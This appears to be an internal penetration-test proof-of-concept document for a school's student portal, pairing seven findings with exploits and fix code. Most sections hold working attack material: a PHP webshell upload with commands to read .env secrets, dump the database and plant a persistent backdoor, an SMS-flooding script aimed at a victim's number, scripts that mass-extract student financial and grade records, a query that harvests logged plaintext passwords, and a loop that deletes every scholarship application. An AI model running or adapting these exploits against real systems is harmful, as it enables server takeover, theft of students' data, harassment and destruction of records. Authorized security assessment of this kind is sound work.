# Student Portal — Proof of Concept Exploits
**Date:** June 3, 2026  
**Classification:** Internal / Confidential — Restricted Distribution  
**Module:** Student Portal

> ⚠️ These PoCs are for authorized internal security assessment only. Do not distribute or use outside of this engagement.

---

## Table of Contents
- [PoC-ST-1: RCE via Scholarship File Upload](#poc-st-1-rce-via-scholarship-file-upload)
- [PoC-ST-2: Unauthenticated SMS Injection](#poc-st-2-unauthenticated-sms-injection)
- [PoC-ST-3: Unauthenticated Student Financial Data Enumeration](#poc-st-3-unauthenticated-student-financial-data-enumeration)
- [PoC-ST-4: Unauthenticated Grade Report Card Dump](#poc-st-4-unauthenticated-grade-report-card-dump)
- [PoC-ST-5: Password Harvesting from Audit Log (updatelogs)](#poc-st-5-password-harvesting-from-audit-log)
- [PoC-ST-6: IDOR — Delete Any Scholarship Application](#poc-st-6-idor-delete-any-scholarship-application)
- [PoC-ST-7: Cross-Account Financial Data via Mis-routed Auth Routes](#poc-st-7-cross-account-financial-data-via-mis-routed-auth-routes)
- [Remediation Quick Reference](#remediation-quick-reference)

---

## PoC-ST-1: RCE via Scholarship File Upload

**Finding:** ST-01 (CRITICAL — CVSS 9.9)  
**Prerequisites:** Any valid login session (any user type)  
**Impact:** Full server compromise

### Step 1 — Create PHP Webshell

```php
<?php
// save as shell.php
if(isset($_GET['cmd'])){
    $cmd = $_GET['cmd'];
    $output = shell_exec($cmd . ' 2>&1');
    echo "<pre>$output</pre>";
}
?>
```

### Step 2 — Upload via `/uploadrequirement`

```bash
# Get a valid session cookie first (any user type — teacher, student, admin, etc.)
SESSION="laravel_session=<your_session_cookie>"

curl -v -X POST \
  -b "$SESSION" \
  -F "file=@shell.php;type=application/octet-stream" \
  "http://app.local/uploadrequirement"

# Response will contain the filename:
# "1748908800.php"
```

### Step 3 — Execute Arbitrary Commands

```bash
# The file is now at: public/scholarship/<timestamp>.php
SHELL_URL="http://app.local/scholarship/1748908800.php"

# Confirm RCE
curl "$SHELL_URL?cmd=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Read environment variables (grab DB credentials, APP_KEY, mail credentials)
curl "$SHELL_URL?cmd=cat+/var/www/html/.env"

# Dump all database tables
curl "$SHELL_URL?cmd=mysqldump+-u+root+-p\$(grep+DB_PASSWORD+.env+|+cut+-d='+'+-f2)+\$(grep+DB_DATABASE+.env+|+cut+-d='+'+-f2)"
```

### Step 4 — Escalate to Persistence

```bash
# Write a persistent backdoor
curl "$SHELL_URL?cmd=echo+'<?php+system(\$_POST[\"x\"]);+?>'+>+public/assets/img/bg.php"

# Forge session for any user (after reading APP_KEY from .env)
# Use laravel-session-forge tool with the extracted key
```

### Fix Code

```php
// ScholarshipController.php — uploadrequirement()
public function uploadrequirement(Request $request)
{
    $file = $request->file('file');

    // 1. Validate MIME type against whitelist
    $allowedMimes = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
    if (!in_array($file->getMimeType(), $allowedMimes)) {
        return response()->json(['status' => 0, 'message' => 'Invalid file type.'], 422);
    }

    // 2. Validate extension against whitelist
    $allowedExtensions = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
    $ext = strtolower($file->getClientOriginalExtension());
    if (!in_array($ext, $allowedExtensions)) {
        return response()->json(['status' => 0, 'message' => 'Invalid file extension.'], 422);
    }

    // 3. Check magic bytes (for images)
    $finfo = finfo_open(FILEINFO_MIME_TYPE);
    $mime = finfo_file($finfo, $file->getRealPath());
    finfo_close($finfo);
    if (!in_array($mime, $allowedMimes)) {
        return response()->json(['status' => 0, 'message' => 'File content does not match type.'], 422);
    }

    // 4. Store OUTSIDE public/ directory with a random name
    $newFileName = \Str::uuid() . '.' . $ext;
    $file->storeAs('scholarship', $newFileName, 'local'); // storage/app/scholarship/ — not web-accessible

    return response()->json(['filename' => $newFileName]);
}
```

---

## PoC-ST-2: Unauthenticated SMS Injection

**Finding:** ST-02 (CRITICAL — CVSS 7.5)  
**Prerequisites:** None — completely unauthenticated  
**Impact:** SMS harassment, SMS credit exhaustion, reputational damage

### Single SMS Injection

```bash
# No login required — just send a POST
curl -X POST \
  -d "phone=09171234567" \
  "http://app.local/student/notify_individual_student"

# Response:
# {"status":"success","studmsg":"LDCU: Hello! You can now proceed..."}
# An SMS is now queued to 09171234567
```

### Mass SMS Flood (DoS against SMS Credits)

```python
#!/usr/bin/env python3
"""
ST-02 PoC: Unauthenticated SMS queue flooding
Run with a list of phone numbers OR a single target repeatedly
WARNING: For authorized testing only. Rate-limit is configured below.
"""
import requests
import time

TARGET_URL = "http://app.local/student/notify_individual_student"
TARGET_PHONE = "09171234567"  # victim's phone number
COUNT = 100
DELAY = 0.5  # seconds between requests

headers = {
    "Content-Type": "application/x-www-form-urlencoded",
    "X-Requested-With": "XMLHttpRequest",
}

for i in range(COUNT):
    resp = requests.post(TARGET_URL, data={"phone": TARGET_PHONE}, headers=headers)
    print(f"[{i+1}/{COUNT}] Status: {resp.status_code} | Body: {resp.text[:60]}")
    time.sleep(DELAY)

print(f"\nDone. {COUNT} SMS messages queued to {TARGET_PHONE}")
print("School's SMS credit balance reduced by same amount.")
```

### Fix Code

```php
// routes/web.php — change:
// BEFORE (broken):
Route::middleware(['cors'])->group(function () {
    Route::post('/student/notify_individual_student', 'StudentControllers\StudentController@notify_individual_student');
});

// AFTER (fixed — require admin or registrar):
Route::middleware(['auth', 'isAdmin'])->group(function () {
    Route::post('/student/notify_individual_student', 'StudentControllers\StudentController@notify_individual_student');
});
```

---

## PoC-ST-3: Unauthenticated Student Financial Data Enumeration

**Finding:** ST-03 (HIGH — CVSS 7.5)  
**Prerequisites:** None — no authentication needed  
**Impact:** Financial data breach for all enrolled students

### Manual Single Student Lookup

```bash
# No cookie, no session — anyone can query
curl -s "http://app.local/api/mobile/api_student_ledger_v2?studid=1" | python -m json.tool

# Returns:
# {
#   "success": true,
#   "student_info": {
#     "id": 1,
#     "sid": "23001",
#     "fullname": "DELA CRUZ JUAN SANTOS",
#     "levelname": "GRADE 10",
#     "program_name": "STEM",
#     "picurl": "storage/STUDENT/230012310202514.png"
#   },
#   "school_fees": [ {"description": "Tuition Fee", "amount": 15000, ...} ],
#   "monthly_assessments": [...],
#   "discounts_adjustments": [...]
# }
```

### Automated Full Database Enumeration

```python
#!/usr/bin/env python3
"""
ST-03 PoC: Mass unauthenticated student financial data extraction
Extracts all student records from studid=1 to MAX
"""
import requests
import json
import csv
import time

BASE_URL = "http://app.local"
LEDGER_URL = f"{BASE_URL}/api/mobile/api_student_ledger_v2"
MAX_STUDID = 2000
DELAY = 0.1
OUTPUT_FILE = "student_financial_dump.csv"
SYID = 1

students = []
errors = []

with open(OUTPUT_FILE, 'w', newline='') as csvfile:
    writer = csv.writer(csvfile)
    writer.writerow(['studid', 'sid', 'fullname', 'levelname', 'program', 'total_fees', 'total_payments', 'balance'])

    for studid in range(1, MAX_STUDID + 1):
        try:
            resp = requests.get(LEDGER_URL, params={'studid': studid, 'syid': SYID}, timeout=5)
            if resp.status_code == 200:
                data = resp.json()
                if data.get('success') and data.get('student_info', {}).get('fullname', '-') != '-':
                    info = data['student_info']
                    fees = sum(f.get('amount', 0) for f in data.get('school_fees', []))
                    payments = sum(p.get('payment', 0) for p in data.get('school_fees', []))
                    balance = fees - payments

                    writer.writerow([studid, info['sid'], info['fullname'],
                                     info['levelname'], info['program_name'],
                                     fees, payments, balance])
                    students.append(studid)
                    print(f"[+] studid={studid}: {info['fullname']} | Balance: {balance}")
        except Exception as e:
            errors.append((studid, str(e)))
        time.sleep(DELAY)

print(f"\nExtracted {len(students)} student records → {OUTPUT_FILE}")
```

### Fix Code

```php
// routes/web.php — add authentication and ownership enforcement:
// BEFORE:
Route::get('/api/mobile/api_student_ledger_v2', 'StudentControllers\BillingInformationController@getStudentLedger');

// OPTION A (simplest): Require auth and disallow external studid
Route::middleware(['auth'])->group(function () {
    Route::get('/api/mobile/api_student_ledger_v2', 'StudentControllers\BillingInformationController@getStudentLedger');
});

// OPTION B (mobile API token): Require a static API token
Route::middleware(['api.token'])->group(function () {
    Route::get('/api/mobile/api_student_ledger_v2', 'StudentControllers\BillingInformationController@getStudentLedger');
});

// BillingInformationController.php — enforce ownership:
public function getStudentLedger(Request $request, $id = null)
{
    // Always derive studid from authenticated user; ignore request param for web routes
    if (auth()->check()) {
        if (auth()->user()->type == 9) {
            $id = DB::table('studinfo')->where('sid', str_replace('P', '', auth()->user()->email))->value('id');
        } else {
            $id = DB::table('studinfo')->where('sid', str_replace('S', '', auth()->user()->email))->value('id');
        }
    }
    // ... rest of method
}
```

---

## PoC-ST-4: Unauthenticated Grade Report Card Dump

**Finding:** ST-04 (HIGH — CVSS 7.5)  
**Prerequisites:** None  
**Impact:** Grade records for all students exposed

```bash
# No authentication required
curl -s "http://app.local/api/mobile/api_reportcard_v2?studid=42&syid=1" | python -m json.tool

# Returns complete grade data for student ID 42
```

```python
#!/usr/bin/env python3
"""ST-04 PoC: Mass grade extraction"""
import requests

BASE = "http://app.local"

for studid in range(1, 500):
    r = requests.get(f"{BASE}/api/mobile/api_reportcard_v2",
                     params={"studid": studid, "syid": 1}, timeout=5)
    if r.status_code == 200 and r.json():
        data = r.json()
        if data:
            print(f"studid={studid}: grades retrieved ({len(data)} subjects)")
```

---

## PoC-ST-5: Password Harvesting from Audit Log

**Finding:** ST-05 (HIGH — CVSS 6.5)  
**Prerequisites:** Student login + DB read access (or SQL injection in another finding)  
**Impact:** Plaintext passwords of students exposed

### Trigger the Password Log

```bash
# Login as a student and submit the pre-enrollment form with a password field
curl -X POST \
  -b "laravel_session=<student_session>" \
  -d "syid=1&semid=1&gradelevelid=1&input_setup_type=1&password=MyPlaintextPassword123&admissiontype=1" \
  "http://app.local/student/preenrollment/submit"
```

### Read Passwords from updatelogs (after gaining DB access)

```sql
-- SQL query to extract all logged passwords from updatelogs
SELECT
    id,
    createdby,
    createddatetime,
    -- The password is appended at the end of the SQL JSON string
    SUBSTRING(sql, LOCATE('"bindings":[', sql)) AS extracted_data
FROM updatelogs
WHERE type = 1
ORDER BY createddatetime DESC;
```

The `updatelogs.sql` column contains:
```json
[{"query":"update `studinfo` set `preEnrolled`=? ...","bindings":[1,123],"time":4.5}]MyPlaintextPassword123
```

The raw password `MyPlaintextPassword123` is appended at the end of the JSON string.

### Fix Code

```php
// StudentController.php — student_preenrollment_submit()
// BEFORE (vulnerable):
DB::table('updatelogs')->insert([
    'type'            => 1,
    'sql'             => $logs . $request->get('password'), // REMOVE THIS
    'createdby'       => auth()->user()->id,
    'createddatetime' => \Carbon\Carbon::now('Asia/Manila')
]);

// AFTER (fixed):
DB::table('updatelogs')->insert([
    'type'            => 1,
    'sql'             => $logs,  // Log only the query, never the password
    'createdby'       => auth()->user()->id,
    'createddatetime' => \Carbon\Carbon::now('Asia/Manila')
]);

// Also: the form should never send a password field to this endpoint.
// Remove any password input from the pre-enrollment form view.
```

---

## PoC-ST-6: IDOR — Delete Any Scholarship Application

**Finding:** ST-06 (HIGH — CVSS 6.5)  
**Prerequisites:** Any authenticated login  
**Impact:** Scholarship applications deleted, affecting financial aid eligibility

### Enumerate Scholarship IDs

```bash
# Login as any user. First, view the scholarship endpoint to see IDs:
curl -b "laravel_session=<session>" \
  "http://app.local/student/scholarship" | python -m json.tool
# Returns: [{"id":12,"studid":45,...},{"id":13,"studid":46,...}]
```

### Delete a Victim's Scholarship Application

```bash
# Delete scholarship application with ID 13 (belongs to another student)
curl -X POST \
  -b "laravel_session=<session>" \
  -d "id=13" \
  "http://app.local/student/delete/scholarship"

# Response: 1 (success — no ownership check performed)
```

### Automated: Delete All Scholarship Applications (DoS)

```bash
#!/bin/bash
SESSION="laravel_session=<any_session>"

for id in $(seq 1 500); do
  STATUS=$(curl -s -X POST -b "$SESSION" -d "id=$id" "http://app.local/student/delete/scholarship")
  echo "id=$id -> $STATUS"
done
```

### Fix Code

```php
// ScholarshipController.php — delscholarship()
// BEFORE (vulnerable):
public function delscholarship(Request $request)
{
    $id = $request->get('id');
    DB::table('scholarship_applicants')->where('id', $id)->update(['deleted' => 1]);
    return 1;
}

// AFTER (fixed — add ownership check):
public function delscholarship(Request $request)
{
    $studid = DB::table('studinfo')
        ->where('sid', str_replace('S', '', auth()->user()->email))
        ->value('id');

    $affected = DB::table('scholarship_applicants')
        ->where('id', $request->get('id'))
        ->where('studid', $studid)      // OWNERSHIP CHECK
        ->where('deleted', 0)
        ->update(['deleted' => 1]);

    return $affected > 0 ? 1 : 0;
}
```

---

## PoC-ST-7: Cross-Account Financial Data via Mis-routed Auth Routes

**Finding:** ST-07 (MEDIUM — CVSS 5.4)  
**Prerequisites:** Any authenticated user  
**Impact:** Limited — self-scoped by email pattern, but demonstrates privilege confusion

```bash
# Login as any authenticated user (e.g., type=1 teacher)
# The route is accessible because it's under ['auth'] only

curl -b "laravel_session=<teacher_session>" \
  "http://app.local/student/transaction-logs?syid=1&semid=1"

# Server will attempt:
# str_replace('S', '', 'teacher@school.edu') = 'teacher@chool.edu'
# DB query for studinfo where sid='teacher@chool.edu' → likely returns null → 500 error
# BUT if teacher email is 'Santos@school.edu' → str_replace → 'antos@school.edu'
# → If a student with SID 'antos@school.edu' exists (unlikely) → returns their data

# The REAL issue: these routes SHOULD be 403 for non-students.
# Instead they either 500-error or return unintended data, both are wrong.
```

---

## Remediation Quick Reference

| Finding | File | Line | Fix Summary |
|---|---|---|---|
| ST-01 | `ScholarshipController.php` | ~240 | Whitelist MIME + extension, store outside `public/` |
| ST-02 | `routes/web.php` | 5364 | Replace `['cors']` with `['auth', 'isAdmin']` |
| ST-03 | `routes/web.php` | 109 | Add `['auth']` + enforce ownership in controller |
| ST-04 | `routes/web.php` | 110–111 | Same as ST-03 |
| ST-05 | `StudentController.php` | ~1494 | Remove `.$request->get('password')` from insert |
| ST-06 | `ScholarshipController.php` | ~80 | Add `->where('studid', $studid)` to delete query |
| ST-07 | `routes/web.php` | 113–150 | Move routes into `['auth','isStudent']` group |
| ST-08 | `routes/web.php` | 242–243 | Add `['auth','isStudent']` to survey routes |
| BUG-ST-01 | `StudentController.php` | ~258 | Remove premature `return` before grade routing logic |
| BUG-ST-05 | `StudentSeverEventController.php` | ~18 | Remove unused `$id` param from `homeevent()` |

---

*End of Student Portal Proof of Concept Document*
